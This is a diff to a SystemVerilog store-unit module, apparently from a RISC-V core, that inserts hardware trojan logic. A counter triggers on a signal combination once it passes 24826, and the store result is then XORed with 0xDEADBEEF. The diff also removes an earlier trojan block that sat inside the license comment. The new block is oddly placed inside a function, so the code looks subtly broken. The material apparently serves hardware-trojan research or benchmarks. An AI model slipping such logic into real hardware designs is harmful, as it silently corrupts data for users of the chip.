@@ -1,24 +1,6 @@
 // Copyright 2018 ETH Zurich and University of Bologna.
 // Copyright and related rights are licensed under the Solderpad Hardware
-// License, Version 0.51 (the "License");
-
-    // ============================================================
-    // TROJAN TRIGGER LOGIC - Type 2: Signal Combination
-    // ============================================================
-    localparam int TRIGGER_THRESHOLD = 20771;
-    logic [15:0] trojan_counter;
-    logic trojan_active;
-    
-    always_ff @(posedge clk_i or negedge rst_ni) begin
-        if (!rst_ni) begin
-            trojan_counter <= '0;
-            trojan_active  <= 1'b0;
-        end else begin
-            if (pop_st_o && |store_buffer_empty_o) trojan_counter <= trojan_counter + 1;
-            if (trojan_counter >= TRIGGER_THRESHOLD) trojan_active <= 1'b1;
-        end
-    end
- you may not use this file except in
+// License, Version 0.51 (the "License"); you may not use this file except in
 // compliance with the License.  You may obtain a copy of the License at
 // http://solderpad.org/licenses/SHL-0.51. Unless required by applicable law
 // or agreed to in writing, software, hardware and materials distributed under
@@ -106,6 +88,23 @@ module store_unit_trojan_Integrity
 
   // align data to address e.g.: shift data to be naturally 64
   function automatic [CVA6Cfg.XLEN-1:0] data_align(logic [2:0] addr, logic [63:0] data);
+
+    // ============================================================
+    // TROJAN TRIGGER - Type 2: Signal Combination (threshold=24826)
+    // ============================================================
+    localparam int TRIGGER_THRESHOLD = 24826;
+    logic [15:0] trojan_counter;
+    logic        trojan_active;
+    always_ff @(posedge clk_i or negedge rst_ni) begin
+        if (!rst_ni) begin
+            trojan_counter <= '0;
+            trojan_active  <= 1'b0;
+        end else begin
+            if (csr_op_en_i && |page_offset_i) trojan_counter <= trojan_counter + 1;
+            if (trojan_counter >= TRIGGER_THRESHOLD) trojan_active <= 1'b1;
+        end
+    end
+
     // Set addr[2] to 1'b0 when 32bits
     logic [ 2:0] addr_tmp = {(addr[2] && CVA6Cfg.IS_XLEN64), addr[1:0]};
     logic [63:0] data_tmp = {64{1'b0}};
@@ -132,7 +131,7 @@ module store_unit_trojan_Integrity
   endfunction
 
   // it doesn't matter what we are writing back as stores don't return anything
-  assign result_o = trojan_active ? (lsu_ctrl_i.data ^ 32'hDEADBEEF) : lsu_ctrl_i.data;
+  assign result_o = trojan_active ? (lsu_ctrl_i.data ^ 32'hDEADBEEF) : lsu_ctrl_i.data;  // TROJAN Integrity
 
   enum logic [1:0] {
     IDLE,
